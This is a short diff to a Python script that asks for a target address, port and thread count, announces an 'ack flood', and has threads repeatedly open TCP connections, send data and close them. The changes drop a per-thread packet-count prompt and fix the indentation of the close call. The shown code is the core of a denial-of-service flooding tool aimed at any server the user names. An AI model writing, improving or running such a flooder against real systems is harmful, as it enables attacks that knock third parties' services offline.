@@ -19,7 +19,6 @@ time.sleep(0.5)
 ip = str(input("Url/ip:"))
 port = int(input("Port:"))
 thread_num = int(input("Threads:"))
-times = int(input("Hit packets for a thread:"))
 print ("[!]Start a ack flood\r\n[!]Thread:",thread_num)
 time.sleep(1)
 
@@ -31,7 +30,7 @@ def run():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port)))
 			s.send(bytes)
-      s.close() #Close the connection and the server will do the LAST_ACK
+			s.close() #Close the connection and the server will do the LAST_ACK
 			print ("[*]Request sent!")
 		except:
 			s.close()
